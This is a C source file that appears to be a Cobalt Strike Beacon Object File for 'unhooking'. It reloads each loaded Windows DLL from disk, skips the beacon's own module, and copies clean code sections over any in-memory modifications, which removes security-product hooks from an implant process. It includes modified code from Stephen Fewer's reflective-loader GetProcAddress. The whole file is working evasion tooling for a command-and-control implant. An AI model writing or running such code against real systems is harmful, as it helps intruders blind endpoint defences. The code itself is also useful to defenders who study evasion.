#include "refresh.h"
#include "apisetmap.h"
#include "ReflectiveLoader.h"
#include "unhook.h"
#include "beacon.h"

BOOL IsBeaconDLL(char* stomp, size_t beaconDllLength, PWSTR wszBaseDllName, USHORT BaseDllLength)
{
    BOOL isBeacon = FALSE;
    if (beaconDllLength * 2 == BaseDllLength)
    {
        isBeacon = TRUE;
        for (int i = 0; i < beaconDllLength; i++)
        {
            // make them lower case
            char c1 = stomp[i];
            char c2 = wszBaseDllName[i];
            if (c1 >= 'A' && c1 <= 'Z')
                c1 += 32;
            if (c2 >= 'A' && c2 <= 'Z')
                c2 += 32;
            if (c1 != c2)
            {
                isBeacon = FALSE;
                break;
            }
        }
    }
    return isBeacon;
}

void RefreshPE(void * buffer, char* stomp)
{
    HMODULE hModule;
    PWSTR wszFullDllName;
    PWSTR wszBaseDllName;
    ULONG_PTR pDllBase;

    PLDR_DATA_TABLE_ENTRY pLdteHead = NULL;
    PLDR_DATA_TABLE_ENTRY pLdteCurrent = NULL;

    char skipModules[32][64];
    size_t modulesToSkip = 0;

    for(size_t i = 0; i < 32; i++) {
        MSVCRT$memset(&skipModules[i], 0, 64);
    }

    char *comma = MSVCRT$strtok(stomp, ",");
    
    if(comma != NULL) {
        while(comma != NULL) {
            MSVCRT$strncpy(skipModules[modulesToSkip++], comma, 63);
            comma = MSVCRT$strtok(NULL, ",");
        }
    }
    else {
        MSVCRT$strncpy(skipModules[modulesToSkip++], stomp, 63);
    }

    dprintf("[REFRESH] Running DLLRefresher");

    pLdteHead = GetInMemoryOrderModuleList();
    pLdteCurrent = pLdteHead;

    do {
        BOOL dllToSkip = FALSE;

        for(size_t i = 0; i < modulesToSkip; i++)
        {
            if(IsBeaconDLL(skipModules[i], MSVCRT$strlen(skipModules[i]), pLdteCurrent->BaseDllName.pBuffer, pLdteCurrent->BaseDllName.Length))
            {
                dllToSkip = TRUE;
                break;
            }
        }

        if (pLdteCurrent->FullDllName.Length > 2 && !dllToSkip)
        {
            wszFullDllName = pLdteCurrent->FullDllName.pBuffer;
            wszBaseDllName = pLdteCurrent->BaseDllName.pBuffer;
            pDllBase = (ULONG_PTR)pLdteCurrent->DllBase;

            dprintf("[REFRESH] Refreshing DLL: %S", wszFullDllName);

            hModule = CustomLoadLibrary(wszFullDllName, wszBaseDllName, pDllBase);

            if (hModule)
            {
                ScanAndFixModule(buffer, (PCHAR)hModule, (PCHAR)pDllBase, wszBaseDllName);
                KERNEL32$VirtualFree(hModule, 0, MEM_RELEASE);
            }
        }
        pLdteCurrent = (PLDR_DATA_TABLE_ENTRY)pLdteCurrent->InMemoryOrderModuleList.Flink;
    } while (pLdteCurrent != pLdteHead);
}

HMODULE CustomLoadLibrary(const PWCHAR wszFullDllName, const PWCHAR wszBaseDllName, ULONG_PTR pDllBase)
{
    // File handles
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE hMap = NULL;
    PCHAR pFile = NULL;

    // PE headers
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeader;
    PIMAGE_SECTION_HEADER pSectionHeader;

    // Library 
    PCHAR pLibraryAddr = NULL;
    DWORD dwIdx;

    // Relocation
    PIMAGE_DATA_DIRECTORY pDataDir;
    PIMAGE_BASE_RELOCATION pBaseReloc;
    ULONG_PTR pReloc;
    DWORD dwNumRelocs;
    ULONG_PTR pInitialImageBase;
    PIMAGE_RELOC pImageReloc;

    // Import
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PCHAR szDllName;
    SIZE_T stDllName;
    PWSTR wszDllName = NULL;
    PWCHAR wsRedir = NULL;
    PWSTR wszRedirName = NULL;
    SIZE_T stRedirName;
    SIZE_T stSize;

    HMODULE hModule;
    PIMAGE_THUNK_DATA pThunkData;
    FARPROC* pIatEntry;

    // clr.dll hotpatches itself at runtime for performance reasons, so skip it
    if (wcscmp(L"clr.dll", wszBaseDllName) == 0)
        goto cleanup;

    dprintf("[REFRESH] Opening file: %S", wszFullDllName);

    // ----
    // Step 1: Map the file into memory
    // ----

    hFile = KERNEL32$CreateFileW(wszFullDllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        goto cleanup;

    hMap = KERNEL32$CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hMap == NULL)
        goto cleanup;

    pFile = (PCHAR)KERNEL32$MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (pFile == NULL)
        goto cleanup;

    // ----
    // Step 2: Parse the file headers and load it into memory
    // ----
    pDosHeader = (PIMAGE_DOS_HEADER)pFile;
    pNtHeader = (PIMAGE_NT_HEADERS)(pFile + pDosHeader->e_lfanew);

    // allocate memory to copy DLL into
    dprintf("[REFRESH] Allocating memory for library");
    pLibraryAddr = (PCHAR)KERNEL32$VirtualAlloc(NULL, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy header
    dprintf("[REFRESH] Copying PE header into memory");
    __movsb((PBYTE)pLibraryAddr, (PBYTE)pFile, pNtHeader->OptionalHeader.SizeOfHeaders);

    // copy sections
    dprintf("[REFRESH] Copying PE sections into memory");
    pSectionHeader = (PIMAGE_SECTION_HEADER)(pFile + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    for (dwIdx = 0; dwIdx < pNtHeader->FileHeader.NumberOfSections; dwIdx++)
    {
        __movsb((PBYTE)(pLibraryAddr + pSectionHeader[dwIdx].VirtualAddress),
               (PBYTE)(pFile + pSectionHeader[dwIdx].PointerToRawData),
               pSectionHeader[dwIdx].SizeOfRawData);
    }

    // update our pointers to the loaded image
    pDosHeader = (PIMAGE_DOS_HEADER)pLibraryAddr;
    pNtHeader = (PIMAGE_NT_HEADERS)(pLibraryAddr + pDosHeader->e_lfanew);

    // ----
    // Step 3: Calculate relocations
    // ----
    dprintf("[REFRESH] Calculating file relocations");

    pDataDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    pInitialImageBase = pNtHeader->OptionalHeader.ImageBase;
    // set the ImageBase to the already loaded module's base
    pNtHeader->OptionalHeader.ImageBase = pDllBase;

    // check if their are any relocations present
    if (pDataDir->Size)
    {
        // calculate the address of the first IMAGE_BASE_RELOCATION entry
        pBaseReloc = (PIMAGE_BASE_RELOCATION)(pLibraryAddr + pDataDir->VirtualAddress);

        // iterate through each relocation entry
        while ((PCHAR)pBaseReloc < (pLibraryAddr + pDataDir->VirtualAddress + pDataDir->Size) && pBaseReloc->SizeOfBlock)
        {
            // the VA for this relocation block
            pReloc = (ULONG_PTR)(pLibraryAddr + pBaseReloc->VirtualAddress);

            // number of entries in this relocation block
            dwNumRelocs = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

            // first entry in the current relocation block
            pImageReloc = (PIMAGE_RELOC)((PCHAR)pBaseReloc + sizeof(IMAGE_BASE_RELOCATION));

            // iterate through each entry in the relocation block
            while (dwNumRelocs--)
            {
                // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                // we subtract the initial ImageBase and add in the original dll base
                if (pImageReloc->type == IMAGE_REL_BASED_DIR64)
                {
                    *(ULONG_PTR *)(pReloc + pImageReloc->offset) -= pInitialImageBase;
                    *(ULONG_PTR *)(pReloc + pImageReloc->offset) += pDllBase;
                }
                else if (pImageReloc->type == IMAGE_REL_BASED_HIGHLOW)
                {
                    *(DWORD *)(pReloc + pImageReloc->offset) -= (DWORD)pInitialImageBase;
                    *(DWORD *)(pReloc + pImageReloc->offset) += (DWORD)pDllBase;
                }
                else if (pImageReloc->type == IMAGE_REL_BASED_HIGH)
                {
                    *(WORD *)(pReloc + pImageReloc->offset) -= HIWORD(pInitialImageBase);
                    *(WORD *)(pReloc + pImageReloc->offset) += HIWORD(pDllBase);
                }
                else if (pImageReloc->type == IMAGE_REL_BASED_LOW)
                {
                    *(WORD *)(pReloc + pImageReloc->offset) -= LOWORD(pInitialImageBase);
                    *(WORD *)(pReloc + pImageReloc->offset) += LOWORD(pDllBase);
                }

                // get the next entry in the current relocation block
                pImageReloc = (PIMAGE_RELOC)((PCHAR)pImageReloc + sizeof(IMAGE_RELOC));
            }

            // get the next entry in the relocation directory
            pBaseReloc = (PIMAGE_BASE_RELOCATION)((PCHAR)pBaseReloc + pBaseReloc->SizeOfBlock);
        }
    }

    // ----
    // Step 4: Update import table
    // ----
    dprintf("[REFRESH] Resolving Import Address Table (IAT) ");

    pDataDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pDataDir->Size)
    {
        pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pLibraryAddr + pDataDir->VirtualAddress);

        while (pImportDesc->Characteristics)
        {
            hModule = NULL;
            wszDllName = NULL;
            szDllName = (PCHAR)(pLibraryAddr + pImportDesc->Name);
            stDllName = strnlen(szDllName, MAX_PATH);
            wszDllName = (PWSTR)calloc(stDllName + 1, sizeof(WCHAR));

            if (wszDllName == NULL)
                goto next_import;

            mbstowcs_s(&stSize, wszDllName, stDllName + 1, szDllName, stDllName);

            dprintf("[REFRESH] Loading library: %S from %s", wszDllName, szDllName);

            // If the DLL starts with api- or ext-, resolve the redirected name and load it
            if (_wcsnicmp(wszDllName, L"api-", 4) == 0 || _wcsnicmp(wszDllName, L"ext-", 4) == 0)
            {
                // wsRedir is not null terminated
                wsRedir = GetRedirectedName(wszBaseDllName, wszDllName, &stRedirName);
                if (wsRedir)
                {
                    // Free the original wszDllName and allocate a new buffer for the redirected dll name
                    free(wszDllName);
                    wszDllName = (PWSTR)calloc(stRedirName + 1, sizeof(WCHAR));
                    if (wszDllName == NULL)
                        goto next_import;

                    __movsb((PBYTE)wszDllName, (PBYTE)wsRedir, stRedirName * sizeof(WCHAR));
                    dprintf("[REFRESH] Redirected library: %S", wszDllName);
                }
            }

            // Load the module
            hModule = CustomGetModuleHandleW(wszDllName);

            // Ignore libraries that fail to load
            if (hModule == NULL)
                goto next_import;

            if (pImportDesc->OriginalFirstThunk)
                pThunkData = (PIMAGE_THUNK_DATA)(pLibraryAddr + pImportDesc->OriginalFirstThunk);
            else
                pThunkData = (PIMAGE_THUNK_DATA)(pLibraryAddr + pImportDesc->FirstThunk);

            pIatEntry = (FARPROC*)(pLibraryAddr + pImportDesc->FirstThunk);

            // loop through each thunk and resolve the import
            for(; DEREF(pThunkData); pThunkData++, pIatEntry++)
            {
                if (IMAGE_SNAP_BY_ORDINAL(pThunkData->u1.Ordinal))
                    *pIatEntry = CustomGetProcAddressEx(hModule, (PCHAR)IMAGE_ORDINAL(pThunkData->u1.Ordinal), wszDllName);
                else
                    *pIatEntry = CustomGetProcAddressEx(hModule, ((PIMAGE_IMPORT_BY_NAME)(pLibraryAddr + DEREF(pThunkData)))->Name, wszDllName);
            }

next_import:
            if (wszDllName != NULL)
            {
                free(wszDllName);
                wszDllName = NULL;
            }
            pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PCHAR)pImportDesc + sizeof(IMAGE_IMPORT_DESCRIPTOR));

        }
    }

cleanup:
    if (pFile != NULL)
        KERNEL32$UnmapViewOfFile(pFile);
    if (hMap != NULL)
        KERNEL32$CloseHandle(hMap);
    if (hFile != INVALID_HANDLE_VALUE)
        KERNEL32$CloseHandle(hFile);

    return (HMODULE) pLibraryAddr;
}

HMODULE CustomGetModuleHandleW(const PWSTR wszModule)
{
    HMODULE hModule = NULL;
    PLDR_DATA_TABLE_ENTRY pLdteHead = NULL;
    PLDR_DATA_TABLE_ENTRY pLdteCurrent = NULL;

    dprintf("[REFRESH] Searching for loaded module: %S", wszModule);

    pLdteCurrent = pLdteHead = GetInMemoryOrderModuleList();

    do {
        if (pLdteCurrent->FullDllName.Length > 2 &&
            _wcsnicmp(wszModule, pLdteCurrent->BaseDllName.pBuffer, pLdteCurrent->BaseDllName.Length / 2) == 0)
        {
            return ((HMODULE)pLdteCurrent->DllBase);
        }
        pLdteCurrent = (PLDR_DATA_TABLE_ENTRY)pLdteCurrent->InMemoryOrderModuleList.Flink;
    } while (pLdteCurrent != pLdteHead);

    return KERNEL32$LoadLibraryW(wszModule);
}

VOID ScanAndFixModule(void * buffer, PCHAR pKnown, PCHAR pSuspect, PWCHAR wszBaseDllName)
{
    // PE headers
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeader;
    PIMAGE_SECTION_HEADER pSectionHeader;

    DWORD dwIdx;

    dprintf("[REFRESH] Scanning module: %S", wszBaseDllName);

    pDosHeader = (PIMAGE_DOS_HEADER)pKnown;
    pNtHeader = (PIMAGE_NT_HEADERS)(pKnown + pDosHeader->e_lfanew);

    // Scan PE header
    ScanAndFixSection(buffer, wszBaseDllName, "Header", pKnown, pSuspect, pNtHeader->OptionalHeader.SizeOfHeaders);

    // Scan each section
    pSectionHeader = (PIMAGE_SECTION_HEADER)(pKnown + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    for (dwIdx = 0; dwIdx < pNtHeader->FileHeader.NumberOfSections; dwIdx++)
    {
		if (pSectionHeader[dwIdx].Characteristics & IMAGE_SCN_MEM_WRITE)
			continue;

		if (!((wcscmp(wszBaseDllName, L"clr.dll") == 0 && strcmp(pSectionHeader[dwIdx].Name, ".text") == 0)))
		{
			ScanAndFixSection(buffer, wszBaseDllName, (PCHAR)pSectionHeader[dwIdx].Name, pKnown + pSectionHeader[dwIdx].VirtualAddress,
				pSuspect + pSectionHeader[dwIdx].VirtualAddress, pSectionHeader[dwIdx].Misc.VirtualSize);
		}
    }
}

VOID ScanAndFixSection(void * buffer, PWCHAR dll, PCHAR szSectionName, PCHAR pKnown, PCHAR pSuspect, size_t stLength)
{
    DWORD ddOldProtect;

    if (memcmp(pKnown, pSuspect, stLength) != 0)
    {
        BeaconFormatPrintf((formatp *)buffer, "%-20S <%s>\n", dll, szSectionName);
        dprintf("[REFRESH] Found modification in: %s", szSectionName);

        if (!KERNEL32$VirtualProtect(pSuspect, stLength, PAGE_EXECUTE_READWRITE, &ddOldProtect))
            return;

        dprintf("[REFRESH] Copying known good section into memory.");
        __movsb((PBYTE)pSuspect, (PBYTE)pKnown, stLength);

        if (!KERNEL32$VirtualProtect(pSuspect, stLength, ddOldProtect, &ddOldProtect))
            dprintf("[REFRESH] Unable to reset memory permissions");
    }
}


// This code is modified from Stephen Fewer's GetProcAddress implementation
//===============================================================================================//
// Copyright (c) 2013, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
FARPROC WINAPI CustomGetProcAddressEx(HMODULE hModule, const PCHAR lpProcName, PWSTR wszOriginalModule)
{
    UINT_PTR uiLibraryAddress = 0;
    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    UINT_PTR uiFuncVA = 0;
    PCHAR cpExportedFunctionName;
    PCHAR szFwdDesc;
    PCHAR szRedirFunc;
    PWSTR wszDllName;
    SIZE_T stDllName;
    PWCHAR wsRedir;
    PWSTR wszRedirName = NULL;
    SIZE_T stRedirName;

    HMODULE hFwdModule;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
    FARPROC fpResult = NULL;
    DWORD dwCounter;

    if (hModule == NULL)
        return NULL;

    // a module handle is really its base address
    uiLibraryAddress = (UINT_PTR)hModule;

    // get the VA of the modules NT Header
    pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);

    pDataDirectory = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // get the VA of the export directory
    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory->VirtualAddress);

    // get the VA for the array of addresses
    uiAddressArray = (uiLibraryAddress + pExportDirectory->AddressOfFunctions);

    // get the VA for the array of name pointers
    uiNameArray = (uiLibraryAddress + pExportDirectory->AddressOfNames);

    // get the VA for the array of name ordinals
    uiNameOrdinals = (uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals);

    // test if we are importing by name or by ordinal...
    #pragma warning(suppress: 4311)
    if (((DWORD)lpProcName & 0xFFFF0000) == 0x00000000)
    {
        // import by ordinal...

        // use the import ordinal (- export ordinal base) as an index into the array of addresses
        #pragma warning(suppress: 4311)
        uiAddressArray += ((IMAGE_ORDINAL((DWORD)lpProcName) - pExportDirectory->Base) * sizeof(DWORD));

        // resolve the address for this imported function
        fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));
    }
    else
    {
        // import by name...
        dwCounter = pExportDirectory->NumberOfNames;
        while (dwCounter--)
        {
            cpExportedFunctionName = (PCHAR)(uiLibraryAddress + DEREF_32(uiNameArray));

            // test if we have a match...
            if (strcmp(cpExportedFunctionName, lpProcName) == 0)
            {
                // use the functions name ordinal as an index into the array of name pointers
                uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
                uiFuncVA = DEREF_32(uiAddressArray);

                // check for redirected exports
                if (pDataDirectory->VirtualAddress <= uiFuncVA && uiFuncVA < (pDataDirectory->VirtualAddress + pDataDirectory->Size))
                {
                    szFwdDesc = (PCHAR)(uiLibraryAddress + uiFuncVA);

					// Find the first character after "."
                    szRedirFunc = strstr(szFwdDesc, ".") + 1;
                    stDllName = (SIZE_T)(szRedirFunc - szFwdDesc);

                    // Allocate enough space to append "dll"
                    wszDllName = (PWSTR)calloc(stDllName + 3 + 1, sizeof(WCHAR));
                    if (wszDllName == NULL)
                        break;

                    mbstowcs_s(NULL, wszDllName, stDllName + 1, szFwdDesc, stDllName);
                    __movsb((PBYTE)(wszDllName + stDllName), (PBYTE)(L"dll"), 3 * sizeof(WCHAR));

                    // check for a redirected module name
                    if (_wcsnicmp(wszDllName, L"api-", 4) == 0 || _wcsnicmp(wszDllName, L"ext-", 4) == 0)
                    {
                        wsRedir = GetRedirectedName(wszOriginalModule, wszDllName, &stRedirName);
                        if (wsRedir)
                        {
                            // Free the original buffer and allocate a new one for the redirected dll name
                            free(wszDllName);

                            wszDllName = (PWSTR)calloc(stRedirName + 1, sizeof(WCHAR));
                            if (wszDllName == NULL)
                                break;

                            __movsb((PBYTE)wszDllName, (PBYTE)wsRedir, stRedirName * sizeof(WCHAR));
                        }
                    }

                    hFwdModule = KERNEL32$GetModuleHandleW(wszDllName);
                    fpResult = CustomGetProcAddressEx(hFwdModule, szRedirFunc, wszDllName);
                    free(wszDllName);
                }
                else
                {
                    // calculate the virtual address for the function
                    fpResult = (FARPROC)(uiLibraryAddress + uiFuncVA);
                }

                // finish...
                break;
            }

            // get the next exported function name
            uiNameArray += sizeof(DWORD);

            // get the next exported function name ordinal
            uiNameOrdinals += sizeof(WORD);
        }
    }

    return fpResult;
}
